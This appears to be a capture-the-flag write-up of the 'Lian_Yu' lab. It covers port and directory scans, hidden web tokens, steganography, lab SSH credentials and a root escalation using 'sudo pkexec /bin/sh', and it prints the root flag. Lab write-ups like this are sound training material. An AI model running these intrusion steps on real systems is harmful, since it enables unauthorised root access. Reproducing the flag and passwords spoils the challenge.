Quick port scan
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -p- --min-rate=10000 10.10.24.189                                                                                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 22:26 EEST
Nmap scan report for 10.10.24.189
Host is up (0.23s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
45525/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
                                                                                                                                  
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -p 21,22,80,111,45525 -sC -sV 10.10.24.189
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 22:27 EEST
Nmap scan report for 10.10.24.189
Host is up (0.24s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp    open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38383/udp6  status
|   100024  1          43590/udp   status
|   100024  1          45525/tcp   status
|_  100024  1          56447/tcp6  status
45525/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds
```


```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.24.189/ -t 200  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.24.189/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/island               (Status: 301) [Size: 235] [--> http://10.10.24.189/island/]
/server-status        (Status: 403) [Size: 199]
```

The island has some text in it
```bash
 Ohhh Noo, Don't Talk...............

I wasn't Expecting You at this Moment. I will meet you there

You should find a way to Lian_Yu as we are planed. The Code Word is:
vigilante
```

After a bit of enumeration we got the following

```bash

view-source:http://10.10.24.189/island/2100/green_arrow.ticket

This is just a token to get into Queen's Gambit(Ship)
RTy8yhBQdscX
```


In the ftp there were 3 images. All of them were png's but one of them was "broken" i used hexeditor to fix the start into correct png format and the image revealed that the password is password. wow very unique

I used that password to reveal the steghid zip file inside one of the images.

inside were the following
```bash
┌──(kali㉿kali)-[~]
└─$ cat passwd.txt   
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.





                                                                                                             
┌──(kali㉿kali)-[~]
└─$ cat shado     
M3tahuman
```

That was the pass for the ssh

And the PrivESC was way too easy
```bash
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$ sudo pkexec /bin/sh
# whoami
root
# cat /root/root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```
Just shows how bad it can be if you are allow an user to run things as root since there are so many ways to escape and create a root shell.
